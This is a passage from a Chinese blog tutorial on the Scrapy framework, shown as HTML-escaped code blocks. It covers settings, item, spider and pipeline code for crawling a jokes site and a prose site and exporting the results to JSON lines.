https://doc.scrapy.org/en/latest/topics/extensions.html</span></span><br><span class=\"line\"><span class=\"comment\"># EXTENSIONS = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Configure item pipelines</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class=\"line\">ITEM_PIPELINES = &#123;</span><br><span class=\"line\">   <span class=\"string\">&#x27;xiushi.pipelines.XiushiPipeline&#x27;</span>: <span class=\"number\">300</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable and configure the AutoThrottle extension (disabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/autothrottle.html</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_ENABLED = True</span></span><br><span class=\"line\"><span class=\"comment\"># The initial download delay</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_START_DELAY = 5</span></span><br><span class=\"line\"><span class=\"comment\"># The maximum download delay to be set in case of high latencies</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_MAX_DELAY = 60</span></span><br><span class=\"line\"><span class=\"comment\"># The average number of requests Scrapy should be sending in parallel to</span></span><br><span class=\"line\"><span class=\"comment\"># each remote server</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0</span></span><br><span class=\"line\"><span class=\"comment\"># Enable showing throttling stats for every response received:</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_DEBUG = False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable and configure HTTP caching (disabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_ENABLED = True</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_EXPIRATION_SECS = 0</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_DIR = &#x27;httpcache&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_IGNORE_HTTP_CODES = []</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"spider-部分\"><a href=\"#spider-部分\" class=\"headerlink\" title=\"spider 部分\"></a>spider 部分</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> scrapy</span><br><span class=\"line\"><span class=\"keyword\">from</span> xiushi.items <span class=\"keyword\">import</span> XiushiItem</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">XiushispiderSpider</span>(<span class=\"params\">scrapy.Spider</span>):</span></span><br><span class=\"line\">    name = <span class=\"string\">&#x27;xiushiSpider&#x27;</span></span><br><span class=\"line\">    allowed_domains = [<span class=\"string\">&#x27;qiushidabaike.com&#x27;</span>]</span><br><span class=\"line\">    start_urls = [<span class=\"string\">&#x27;http://qiushidabaike.com/index_1.html&#x27;</span>]</span><br><span class=\"line\">    base_domain = <span class=\"string\">&#x27;http://qiushidabaike.com&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">parse</span>(<span class=\"params\">self, response</span>):</span></span><br><span class=\"line\">        duanzi = response.xpath(<span class=\"string\">&#x27;//div[@class=&quot;main-left fl&quot;]//dl&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> it <span class=\"keyword\">in</span> duanzi:</span><br><span class=\"line\">            title = it.xpath(<span class=\"string\">&#x27;./dt/span/a/text()&#x27;</span>).get().strip()</span><br><span class=\"line\">            text = it.xpath(<span class=\"string\">&#x27;./dd[@class=&quot;content&quot;]//text()&#x27;</span>).getall()</span><br><span class=\"line\">            text = <span class=\"string\">&quot;&quot;</span>.join(text).strip()</span><br><span class=\"line\">            item = XiushiItem(title=title, text=text)</span><br><span class=\"line\">            <span class=\"keyword\">yield</span> item</span><br><span class=\"line\">        <span class=\"comment\"># 进行翻页操作</span></span><br><span class=\"line\">        next_url = response.xpath(<span class=\"string\">&#x27;//div[@class=&quot;page&quot;]//a[@class=&quot;next&quot;]/@href&#x27;</span>).get()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> next_url:</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">yield</span> scrapy.Request(self.base_domain+next_url, callback=self.parse)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"pipelines-部分\"><a href=\"#pipelines-部分\" class=\"headerlink\" title=\"pipelines 部分\"></a>pipelines 部分</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Define your item pipelines here</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Don&#x27;t forget to add your pipeline to the ITEM_PIPELINES setting</span></span><br><span class=\"line\"><span class=\"comment\"># See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\"># 第一种方法，没进行json优化，但是看起来简单易操作</span></span><br><span class=\"line\"><span class=\"string\">import json</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">class XiushiPipeline(object):</span></span><br><span class=\"line\"><span class=\"string\">    def __init__(self):</span></span><br><span class=\"line\"><span class=\"string\">        self.fp = open(&#x27;duanzi.json&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    def open_spider(self, spider):</span></span><br><span class=\"line\"><span class=\"string\">        print(&#x27;爬虫开始了...&#x27;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    def process_item(self, item, spider):</span></span><br><span class=\"line\"><span class=\"string\">        item_json = json.dumps(dict(item),  ensure_ascii=False)</span></span><br><span class=\"line\"><span class=\"string\">        self.fp.write(item_json+&#x27;\\n&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">        return item</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    def close_spider(self, spider):</span></span><br><span class=\"line\"><span class=\"string\">        self.fp.close()</span></span><br><span class=\"line\"><span class=\"string\">        print(&quot;爬虫结束了...&quot;)</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 方案二，json优化，结果是每个字典存储在列表中</span></span><br><span class=\"line\"><span class=\"comment\">#        好处是满足json规则，坏处是数据量较大时比较耗内存</span></span><br><span class=\"line\"><span class=\"comment\"># &#x27;&#x27;&#x27; 自我感觉这种方法不咋地 &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># from scrapy.exporters import JsonItemExporter</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># class XiushiPipeline(object):</span></span><br><span class=\"line\"><span class=\"comment\">#     def __init__(self):</span></span><br><span class=\"line\"><span class=\"comment\">#         # 注意此时以二进制形式写入</span></span><br><span class=\"line\"><span class=\"comment\">#         self.fp = open(&#x27;duanzi.json&#x27;, &#x27;wb&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#         self.exporter = JsonItemExporter(self.fp, ensure_ascii=False, encoding=&#x27;utf-8&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#         self.exporter.start_exporting()</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     def open_spider(self, spider):</span></span><br><span class=\"line\"><span class=\"comment\">#         print(&#x27;爬虫开始了...&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     def process_item(self, item, spider):</span></span><br><span class=\"line\"><span class=\"comment\">#         self.exporter.export_item(item)</span></span><br><span class=\"line\"><span class=\"comment\">#         return item</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     def close_spider(self, spider):</span></span><br><span class=\"line\"><span class=\"comment\">#         self.exporter.finish_exporting()</span></span><br><span class=\"line\"><span class=\"comment\">#         self.fp.close()</span></span><br><span class=\"line\"><span class=\"comment\">#         print(&quot;爬虫结束了...&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;方案三&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> scrapy.exporters <span class=\"keyword\">import</span> JsonLinesItemExporter</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">XiushiPipeline</span>(<span class=\"params\"><span class=\"built_in\">object</span></span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"comment\"># 注意此时以二进制形式写入</span></span><br><span class=\"line\">        self.fp = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;duanzi.json&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>)</span><br><span class=\"line\">        self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=<span class=\"literal\">False</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">open_spider</span>(<span class=\"params\">self, spider</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;爬虫开始了...&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">process_item</span>(<span class=\"params\">self, item, spider</span>):</span></span><br><span class=\"line\">        self.exporter.export_item(item)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> item</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">close_spider</span>(<span class=\"params\">self, spider</span>):</span></span><br><span class=\"line\">        self.fp.close()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;爬虫结束了...&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>可以在总文件中创建.py文件，代替爬虫开始命令 scrapy crawl xiushiSpider (注意应在爬虫目录下执行该命令)</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> scrapy <span class=\"keyword\">import</span> cmdline</span><br><span class=\"line\"></span><br><span class=\"line\">cmdline.execute(<span class=\"string\">&quot;scrapy crawl xiushiSpider&quot;</span>.split())</span><br><span class=\"line\"><span class=\"comment\"># cmdline.execute([&quot;scrapy&quot;, &#x27;crawl&#x27;, &#x27;xiushiSpider&#x27;])</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"爬虫第六天\"><a href=\"#爬虫第六天\" class=\"headerlink\" title=\"爬虫第六天\"></a>爬虫第六天</h1><h3 id=\"scrapy-框架之spider类（示例二-爬取优美散文）\"><a href=\"#scrapy-框架之spider类（示例二-爬取优美散文）\" class=\"headerlink\" title=\"scrapy 框架之spider类（示例二.爬取优美散文）\"></a>scrapy 框架之spider类（示例二.爬取优美散文）</h3><ul>\n<li>item部分</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Define here the models for your scraped items</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># See documentation in:</span></span><br><span class=\"line\"><span class=\"comment\"># https://doc.scrapy.org/en/latest/topics/items.html</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> scrapy</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ProseItem</span>(<span class=\"params\">scrapy.Item</span>):</span></span><br><span class=\"line\">    <span class=\"comment\"># define the fields for your item here like:</span></span><br><span class=\"line\">    <span class=\"comment\"># name = scrapy.Field()</span></span><br><span class=\"line\">    title = scrapy.Field()</span><br><span class=\"line\">    text = scrapy.Field()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>settings部分</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Scrapy settings for prose project</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># For simplicity, this file contains only settings considered important or</span></span><br><span class=\"line\"><span class=\"comment\"># commonly used. You can find more settings consulting the documentation:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/settings.html</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class=\"line\"></span><br><span class=\"line\">BOT_NAME = <span class=\"string\">&#x27;prose&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">SPIDER_MODULES = [<span class=\"string\">&#x27;prose.spiders&#x27;</span>]</span><br><span class=\"line\">NEWSPIDER_MODULE = <span class=\"string\">&#x27;prose.spiders&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class=\"line\"><span class=\"comment\"># USER_AGENT = &#x27;prose (+http://www.yourdomain.com)&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Obey robots.txt rules</span></span><br><span class=\"line\">ROBOTSTXT_OBEY = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Configure maximum concurrent requests performed by Scrapy (default: 16)</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS = 32</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Configure a delay for requests for the same website (default: 0)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay</span></span><br><span class=\"line\"><span class=\"comment\"># See also autothrottle settings and docs</span></span><br><span class=\"line\">DOWNLOAD_DELAY = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"comment\"># The download delay setting will honor only one of:</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS_PER_DOMAIN = 16</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS_PER_IP = 16</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Disable cookies (enabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># COOKIES_ENABLED = False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Disable Telnet Console (enabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># TELNETCONSOLE_ENABLED = False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Override the default request headers:</span></span><br><span class=\"line\">DEFAULT_REQUEST_HEADERS = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept&#x27;</span>: <span class=\"string\">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept-Language&#x27;</span>: <span class=\"string\">&#x27;en&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class=\"line\">                  <span class=\"string\">&#x27;Chrome/80.0.3987.163 Safari/537.36 &#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable or disable spider middlewares</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class=\"line\"><span class=\"comment\"># SPIDER_MIDDLEWARES = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;prose.middlewares.ProseSpiderMiddleware&#x27;: 543,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable or disable downloader middlewares</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class=\"line\"><span class=\"comment\"># DOWNLOADER_MIDDLEWARES = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;prose.middlewares.ProseDownloaderMiddleware&#x27;: 543,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable or disable extensions</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/extensions.html</span></span><br><span class=\"line\"><span class=\"comment\"># EXTENSIONS = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Configure item pipelines</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class=\"line\">ITEM_PIPELINES = &#123;</span><br><span class=\"line\">   <span class=\"string\">&#x27;prose.pipelines.ProsePipeline&#x27;</span>: <span class=\"number\">300</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable and configure the AutoThrottle extension (disabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/autothrottle.html</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_ENABLED = True</span></span><br><span class=\"line\"><span class=\"comment\"># The initial download delay</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_START_DELAY = 5</span></span><br><span class=\"line\"><span class=\"comment\"># The maximum download delay to be set in case of high latencies</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_MAX_DELAY = 60</span></span><br><span class=\"line\"><span class=\"comment\"># The average number of requests Scrapy should be sending in parallel to</span></span><br><span class=\"line\"><span class=\"comment\"># each remote server</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0</span></span><br><span class=\"line\"><span class=\"comment\"># Enable showing throttling stats for every response received:</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_DEBUG = False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable and configure HTTP caching (disabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_ENABLED = True</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_EXPIRATION_SECS = 0</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_DIR = &#x27;httpcache&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_IGNORE_HTTP_CODES = []</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>proseSpider部分</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> scrapy</span><br><span class=\"line\"><span class=\"keyword\">from</span> prose.items <span class=\"keyword\">import</span> ProseItem</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ProsespiderSpider</span>(<span class=\"params\">scrapy.Spider</span>):</span></span><br><span class=\"line\">    name = <span class=\"string\">&#x27;proseSpider&#x27;</span></span><br><span class=\"line\">    allowed_domains = [<span class=\"string\">&#x27;duwenzhang.com&#x27;</span>]</span><br><span class=\"line\">    start_urls = [<span class=\"string\">&#x27;http://www.duwenzhang.com/wenzhang/shenghuosuibi/&#x27;</span>]</span><br><span class=\"line\">    base_url = <span class=\"string\">&#x27;http://www.duwenzhang.com/wenzhang/shenghuosuibi/&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">parse</span>(<span class=\"params\">self, response</span>):</span></span><br><span class=\"line\">        <span class=\"comment\"># xpath 选择不含有某一属性的标签</span></span><br><span class=\"line\">        url_list = response.xpath(<span class=\"string\">&#x27;//center//tr[2]//td[(@valign) and not(@height)]/table&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> it <span class=\"keyword\">in</span> url_list:</span><br><span class=\"line\">            title = it.xpath(<span class=\"string\">&#x27;.//tr[2]//td[@height=&quot;26&quot;]/b/a/text()&#x27;</span>).getall()</span><br><span 